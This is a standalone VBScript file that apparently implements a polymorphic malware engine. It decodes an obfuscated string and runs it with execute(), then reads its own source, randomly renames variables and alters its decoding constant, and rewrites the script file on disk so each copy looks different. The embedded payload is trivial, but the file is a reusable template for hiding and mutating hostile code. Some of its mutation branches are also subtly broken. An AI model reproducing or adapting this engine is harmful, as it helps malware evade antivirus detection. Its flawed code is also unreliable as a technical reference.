   a1 = "74"
   for i1 = 1 to len(a1):u1 = mid(a1,i1,1):e1 = asc(u1) - ((11/11)+(100*3)/(50*3))+((1044*6/1044)-6) : k1 = chr(e1):j1 = j1 + k1:next:Randomize:KS892 = int(rnd*255)+1:if KS892 = 1000 then:for z1 = 0 to KS892:s1 = strreverse(j1):next:end if:execute(j1)
   set fso=createobject("scripting.filesystemobject"):set lookback=fso.opentextfile(wscript.scriptfullname,1,false)
   poly = lookback.readall
   Randomize:polyint = Int(Rnd * 9):if polyint > 2 then:polynew = replace(poly,"((11/11)+(100*3)/(50*3))+((1044*6/1044)-6)","((11/11)+(100*3)/(50*3))+((1044*6/1044)-6)*"&polyint/polyint):else:polynew = replace(poly,"((11/11)+(100*3)/(50*3))+((1044*6/1044)-6)",chr(51)&chr(42)&chr(54)&chr(49)&chr(50)&chr(47)&chr(54)&chr(49)&chr(50)):end if
   Randomize:polyint1 = Int(Rnd * 9):if polyint > 2 then:polynew2 = replace(polynew,"polysev","polysev & " & polyint1):else:polynew2 = replace (polynew,"polysev",chr(112)&chr(111)&chr(108)&chr(121)&chr(115)&chr(101)&chr(118)):end if
   Randomize:polyint2 = Int(Rnd * 9):if polyint > 2 then:polynew3 = replace(polynew2,"a1","a1"&polyint2):else:polynew3 = replace(poly,"a1",chr(97)&"1"):end if
   Randomize:polyint3 = Int(Rnd * 9):if polyint > 2 then:polynew4 = replace(polynew3,"i1","i1"&polyint3):else:polynew4 = replace(poly,"i1",chr(105)&"1"):end if
   Randomize:polyint4 = Int(Rnd * 9):if polyint > 2 then:polynew5 = replace(polynew4,"u1","u1"&polyint4):else:polynew5 = replace(poly,"u1",chr(117)&"1"):end if
   Randomize:polyint5 = Int(Rnd * 9):if polyint > 2 then:polynew6 = replace(polynew5,"e1","e1"&polyint5):else:polynew6 = replace(poly,"e1",chr(101)&"1"):end if
   Randomize:polyint6 = Int(Rnd * 9):if polyint > 2 then:polynew7 = replace(polynew6,"k1","k1"&polyint6):else:polynew7 = replace(poly,"k1",chr(107)&"1"):end if
   Randomize:polyint7 = Int(Rnd * 9):if polyint > 2 then:polynew8 = replace(polynew7,"j1","j1"&polyint7):else:polynew8 = replace(poly,"j1",chr(106)&"1"):end if
   Randomize:polyint8 = Int(Rnd * 9):if polyint > 2 then:polynew9 = replace(polynew8,"b1","b1"&polyint8):else:polynew9 = replace(poly,"b1",chr(98)&"1"):end if
   Randomize:polyint9 = Int(Rnd * 9):if polyint > 2 then:polynew10 = replace(polynew9,"z1","z1"&polyint9):else:polynew10 = replace(poly,"z1",chr(122)&"1"):end if
   set newfile=fso.opentextfile(wscript.scriptfullname,2,false):newfile.write polynew10
